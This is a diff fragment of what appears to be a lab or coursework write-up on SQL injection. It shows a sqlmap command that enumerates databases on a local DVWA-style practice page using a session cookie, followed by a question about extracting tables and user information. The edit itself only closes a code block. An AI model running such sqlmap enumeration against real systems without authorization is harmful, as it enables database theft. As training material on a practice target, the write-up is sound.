@@ -140,7 +140,7 @@ _start:
 5. Get information from the database
    ```bash
       sqlmap -u "http://localhost:8080/vulnerabilities/sqli" --cookie="PHPSESSID=ve43k50u0t2qcfnfdhqkmga390; security=medium " --data="id=1&Submit=Submit" --dbs
-   
+   ```
 **Question 2**: Use sqlmap to get tables, users information
 **Answer 2**:
 
